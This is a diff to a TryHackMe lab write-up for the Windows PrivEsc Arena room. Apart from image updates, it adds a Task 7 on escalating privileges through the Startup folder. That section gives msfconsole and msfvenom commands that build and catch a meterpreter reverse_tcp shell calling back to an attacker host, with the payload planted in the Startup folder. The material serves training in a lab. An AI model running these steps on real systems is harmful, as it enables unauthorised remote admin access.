@@ -4,10 +4,9 @@
 and I’m excited to join you on this adventure, part of my <code>510</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
 <em>Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:***********</em>.<br>
 Access it <a href="https://tryhackme.com/room/windowsprivescarena">here</a>.<br>
-<img width="1200px" src=""></p>
+<img width="1200px" src="https://github.com/user-attachments/assets/703ba7ba-4448-4f79-9c64-84ea59ca0c67"></p>
 
-
-
+<br>
 <h2 align="center">Task 1 . Connecting to TryHackMe network</h2>
 <p>To complete this room and access the vulnerable Windows machine, you need to first connect to TryHackMe's VPN. If you've not done this before, first complete the OpenVPN room and learn how to connect.</p>
 
@@ -307,7 +306,6 @@ PS C:\Temp> net start regsvc
 
 <img width="985" height="552" alt="image" src="https://github.com/user-attachments/assets/aeb6d9e8-9cb2-42af-a0ec-1dc015d1e8dd" />
 
-
 <br>
 <br>
 <br>
@@ -332,5 +330,61 @@ PS C:\Temp> net start regsvc
 <code>No answer needed</code></p>
 
 
+<img width="979" height="243" alt="image" src="https://github.com/user-attachments/assets/65ca7f73-5e1e-413f-9e23-ce2d85fb5cb2" />
+
 <br>
 <br>
+<br>
+
+<img width="972" height="228" alt="image" src="https://github.com/user-attachments/assets/cde2e19d-6a52-4090-bc07-ffe97c85d162" />
+
+<br>
+<br>
+<br>
+<h2 align="center">Task 7 . Privilege Escalation - Stratup Applications/h2>
+<h3 align="center">Detection</h3>
+<p>Windows VM<br>
+
+1. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"<br>
+2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.</p>
+
+<h3 align="center">Exploitation</h3>
+<p>Kali VM<br>
+
+1. Open command prompt and type: msfconsole<br>
+2. In Metasploit (msf > prompt) type: use multi/handler<br>
+3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp<br>
+4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]<br>
+5. In Metasploit (msf > prompt) type: run<br>
+6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe<br>
+7. Copy the generated file, x.exe, to the Windows VM.<br><br>
+
+Windows VM<br>
+
+1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<br>
+2. Logoff.<br>
+3. Login with the administrator account credentials.<br><br>
+
+Kali VM<br>
+
+1. Wait for a session to be created, it may take a few seconds.<br>
+2. In Meterpreter(meterpreter > prompt) type: getuid<br>
+3. From the output, notice the user is “User-PC\Admin”</p>
+
+<p><em>Answer the questions below</em></p>
+
+<p>7.1. Click 'Completed' once you have successfully elevated the machine<br>
+<code>No answer needed</code></p>
+
+<img width="989" height="179" alt="image" src="https://github.com/user-attachments/assets/24312190-a7a6-4a69-921f-83f28d69753d" />
+
+
+<br>
+<br>
+
+```bash
+
+
+```
+
+
